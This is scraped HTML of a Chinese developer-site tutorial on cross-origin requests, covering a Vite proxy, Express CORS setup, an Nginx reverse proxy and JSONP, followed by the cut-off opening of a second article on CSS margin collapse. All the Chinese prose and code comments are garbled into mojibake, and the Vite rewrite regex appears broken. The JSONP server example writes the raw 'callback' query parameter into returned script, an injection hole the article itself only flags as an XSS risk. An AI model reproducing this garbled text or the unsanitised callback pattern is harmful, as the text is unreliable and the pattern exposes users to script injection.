<meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="DongHao"/> <meta itemprop="url" content="https://juejin.cn/user/1855631360790110"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è·¨åŸŸé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1855631360790110/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    DongHao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:36:10.000Z" title="Mon Dec 29 2025 14:36:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2bce013b98a4afe93c566e86a301674~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRG9uZ0hhbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767625377&amp;x-signature=vrjyuDdG1EAtZ%2Bad3sykWlRz3pg%3D" alt="PixPin_2025-12-29_22-12-49.png" loading="lazy"/></p>
<h2 data-id="heading-0">è·¨åŸŸåŸå› </h2>
<p>å½“å‰ç«¯è¯·æ±‚åœ°å€ä¸åç«¯æ¥å£åœ°å€ä¸åŒæºæ—¶ï¼Œæµè§ˆå™¨ä¼šæ‹¦æˆªæ¥å£è¯·æ±‚ï¼Œå‡ºç°è·¨åŸŸé—®é¢˜ã€‚</p>
<p><strong>åŒæº</strong>ï¼šåè®®ã€åŸŸåã€ç«¯å£å¿…é¡»å®Œå…¨ä¸€è‡´ã€‚</p>
<p><strong>è·¨åŸŸ</strong>ï¼šåè®®ã€åŸŸåã€ç«¯å£åªè¦æœ‰ä¸€ä¸ªä¸ä¸€è‡´ï¼Œå°±ä¼šè·¨åŸŸã€‚</p>
<p><strong>åŒæºç­–ç•¥</strong> æ˜¯æµè§ˆå™¨çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œé™åˆ¶ä¸åŒæºçš„ç½‘ç«™ä¹‹é—´è¿›è¡Œæ— é™åˆ¶çš„èµ„æºè®¿é—®æˆ–è„šæœ¬äº¤äº’ï¼Œé˜²æ­¢æ¶æ„ç½‘ç«™é€šè¿‡è„šæœ¬çªƒå–å…¶ä»–ç½‘ç«™çš„æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ Cookieã€æœ¬åœ°å­˜å‚¨ç­‰ï¼‰ã€‚</p>
<h2 data-id="heading-1">è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-2">å‰ç«¯é…ç½®ä»£ç†</h3>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•çš„ <code>vite.config.ts</code> ä¸­é…ç½® <code>server.proxy</code>ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-string">'/api'</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-string">'http://localhost:3000'</span>, <span class="hljs-comment">// åç«¯æ¥å£åœ°å€</span>
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å…è®¸è·¨åŸŸ</span>
        <span class="hljs-attr">rewrite</span>: <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>api/, <span class="hljs-string">''</span>) <span class="hljs-comment">// å»æ‰ '/api' å‰ç¼€</span>
      }
    }
  }
});
</code></pre>
<h3 data-id="heading-3">åç«¯é…ç½® CORS</h3>
<p>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰æ˜¯ W3C å®šä¹‰çš„è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡åç«¯åœ¨å“åº”å¤´ä¸­æ·»åŠ  <code>Access-Control-Allow-Origin</code> ç­‰å­—æ®µï¼Œå‘Šè¯‰æµè§ˆå™¨ â€œå…è®¸å‰ç«¯çš„è·¨åŸŸè¯·æ±‚â€ã€‚</p>
<p>ä»¥ Node.js + Express ä¸ºä¾‹ï¼Œé…ç½®æ–¹å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> cors = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cors'</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();

<span class="hljs-comment">// å…è®¸å‰ç«¯æœ¬åœ°è·¨åŸŸè¯·æ±‚</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cors</span>({
  <span class="hljs-attr">origin</span>: <span class="hljs-string">'http://localhost:5173'</span>, <span class="hljs-comment">// å‰ç«¯å¼€å‘æœåŠ¡å™¨åœ°å€</span>
  <span class="hljs-attr">methods</span>: [<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>], <span class="hljs-comment">// å…è®¸çš„è¯·æ±‚æ–¹æ³•</span>
  <span class="hljs-attr">allowedHeaders</span>: [<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'Authorization'</span>] <span class="hljs-comment">// å…è®¸çš„è¯·æ±‚å¤´</span>
}));

<span class="hljs-comment">// æˆ–è€…æ›´ç®€å•ï¼šå…è®¸æ‰€æœ‰æºï¼ˆå»ºè®®å¼€å‘ç¯å¢ƒä¸´æ—¶ä½¿ç”¨ï¼Œç¦æ­¢ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ï¼‰</span>
<span class="hljs-comment">// app.use(cors());</span>

<span class="hljs-comment">// åç«¯æ¥å£ç¤ºä¾‹</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/user'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">send</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'test'</span> });
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åç«¯æœåŠ¡è¿è¡Œåœ¨ 3000 ç«¯å£'</span>);
});
</code></pre>
<p>é…ç½®åï¼Œåç«¯å“åº”å¤´ä¼šåŒ…å« <code>Access-Control-Allow-Origin</code> ç­‰å­—æ®µï¼Œæµè§ˆå™¨è¯†åˆ«åˆ°è¿™äº›å­—æ®µå°±ä¼šå…è®¸è·¨åŸŸè¯·æ±‚ã€‚</p>
<h3 data-id="heading-4">Nginx åå‘ä»£ç†</h3>
<p>ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå‰ç«¯è¯·æ±‚å‘é€åˆ° Nginx æœåŠ¡å™¨ï¼ˆä¸å‰ç«¯åŒæºï¼‰ï¼ŒNginx å†å°†è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡ï¼Œåç«¯å“åº”æ•°æ®ä¹Ÿé€šè¿‡ Nginx è¿”å›ç»™å‰ç«¯ã€‚æµè§ˆå™¨åªä¸ Nginx äº¤äº’ï¼Œä¸ç›´æ¥ä¸åç«¯é€šä¿¡ï¼Œè€ŒæœåŠ¡å™¨ä¸æœåŠ¡å™¨ä¹‹é—´æ²¡æœ‰ â€œåŒæºç­–ç•¥â€ é™åˆ¶ï¼Œä¹Ÿå°±ä¸å­˜åœ¨è·¨åŸŸé—®é¢˜ã€‚</p>
<pre><code class="hljs language-nginx" lang="nginx"># åå‘ä»£ç†ï¼šæ‰€æœ‰ä»¥ /api å¼€å¤´çš„è¯·æ±‚è½¬å‘åˆ°åç«¯ 3000 ç«¯å£
location /api/ {
    proxy_pass http://127.0.0.1:3000;  # åç«¯æœåŠ¡åœ°å€ï¼ˆæœåŠ¡å™¨æœ¬åœ°ï¼‰
    
    # ä¼ é€’è¯·æ±‚å¤´ä¿¡æ¯ï¼ˆå¿…é¡»é…ç½®ï¼Œå¦åˆ™åç«¯å¯èƒ½æ— æ³•è·å–æ­£ç¡®çš„å®¢æˆ·ç«¯ä¿¡æ¯ï¼‰
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
</code></pre>
<h3 data-id="heading-5">JSONP</h3>
<p>æµè§ˆå™¨ä¸­æœ‰ä¸€äº›æ ‡ç­¾å¤©ç”Ÿå…·æœ‰è·¨åŸŸèƒ½åŠ›ï¼Œå¦‚ï¼š<code>img</code>ã€<code>link</code>ã€<code>iframe</code>ã€<code>script</code> ç­‰ï¼ŒJSONP å°±æ˜¯åˆ©ç”¨äº† <code>script</code> æ ‡ç­¾ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ç‰¹æ€§ã€‚</p>
<ol>
<li>å‰ç«¯æå‰å®šä¹‰å›è°ƒå‡½æ•° <code>fn</code>ï¼Œå¹¶åŠ¨æ€åˆ›å»º <code>script</code> æ ‡ç­¾ï¼Œè®¾ç½® <code>src</code> ä¸º <code>æ¥å£åœ°å€?callback=fn</code>ã€‚</li>
<li>åç«¯è·å–è¯·æ±‚å‚æ•° <code>callback</code>ï¼Œè¿”å›è¯¥å›è°ƒå‡½æ•°çš„è°ƒç”¨å­—ç¬¦ä¸² <code>'fn(data)'</code>ã€‚</li>
<li>æµè§ˆå™¨è·å–åˆ° <code>script</code> æ ‡ç­¾çš„è¿”å›å†…å®¹ï¼ˆå³ <code>'fn(data)'</code>ï¼‰å¹¶è§£ææ‰§è¡Œï¼Œå›è°ƒå‡½æ•° <code>fn</code> åœ¨å‰ç«¯è¢«è°ƒç”¨ï¼Œå°±å¯ä»¥è·å–åˆ°åç«¯è¿”å›çš„ <code>data</code>ã€‚</li>
</ol>
<p>å‰ç«¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æå‰å®šä¹‰å¥½çš„å›è°ƒå‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleData</span>(<span class="hljs-params">data</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è·å–åˆ°çš„è·¨åŸŸæ•°æ®ï¼š'</span>, data);
}

<span class="hljs-comment">// åŠ¨æ€åˆ›å»º script æ ‡ç­¾</span>
<span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'script'</span>);
script.<span class="hljs-property">src</span> = <span class="hljs-string">'http://localhost:3000/api/users?callback=handleData'</span>;

<span class="hljs-comment">// å°† script æ·»åŠ åˆ° bodyï¼Œå‘é€ get è¯·æ±‚</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);
</code></pre>
<p>åç«¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/users'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// è·å–å›è°ƒå‡½æ•°å</span>
  <span class="hljs-keyword">const</span> callback = req.<span class="hljs-property">query</span>.<span class="hljs-property">callback</span>;
  <span class="hljs-keyword">const</span> data = { <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>, <span class="hljs-attr">data</span>: [{ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span> }] };
  <span class="hljs-comment">// è¿”å› `å›è°ƒå‡½æ•°(data)` æ ¼å¼çš„å­—ç¬¦ä¸²</span>
  <span class="hljs-comment">// å‰ç«¯ script æ ‡ç­¾æ‹¿åˆ°è¿”å›å†…å®¹ï¼Œä¼šå°†å­—ç¬¦ä¸²å½“ä½œè„šæœ¬æ‰§è¡Œï¼Œå›è°ƒå‡½æ•°å°±ä¼šåœ¨å‰ç«¯è¢«è°ƒç”¨</span>
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`<span class="hljs-subst">${callback}</span>(<span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(data)}</span>)`</span>);
});
</code></pre>
<p>JSONP æ˜¯ä¼ ç»Ÿæ–¹æ¡ˆï¼Œå±€é™æ€§å¤§ï¼Œä»…æ”¯æŒ <code>GET</code> è¯·æ±‚ï¼ˆå› ä¸º <code>script</code> æ ‡ç­¾åªæ”¯æŒ <code>GET</code> è¯·æ±‚ï¼‰ï¼Œä¸”å­˜åœ¨å®‰å…¨é£é™©ï¼ˆå¯èƒ½é­å— XSS æ”»å‡»ï¼‰ï¼Œå·²è¢« CORS å’Œ Nginx åå‘ä»£ç†æ›¿ä»£ï¼Œä»…åœ¨å…¼å®¹è€æ—§æµè§ˆå™¨åœºæ™¯ä¸‹å¶å°”ä½¿ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»€ä¹ˆæ˜¯marginé‡å ï¼Œå¦‚ä½•è§£å†³]]></title>    <link>https://juejin.cn/post/7589110783146639394</link>    <guid>https://juejin.cn/post/7589110783146639394</guid>    <pubDate>2025-12-29T15:09:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589110783146639394" data-draft-id="7589126814829756468" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»€ä¹ˆæ˜¯marginé‡å ï¼Œå¦‚ä½•è§£å†³"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T15:09:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç çŒäºº"/> <meta itemprop="url" content="https://juejin.cn/user/624972624037374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»€ä¹ˆæ˜¯marginé‡å ï¼Œå¦‚ä½•è§£å†³
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/624972624037374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç çŒäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T15:09:32.000Z" title="Mon Dec 29 2025 15:09:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä»€ä¹ˆæ˜¯ Margin é‡å ï¼Ÿ</h3>
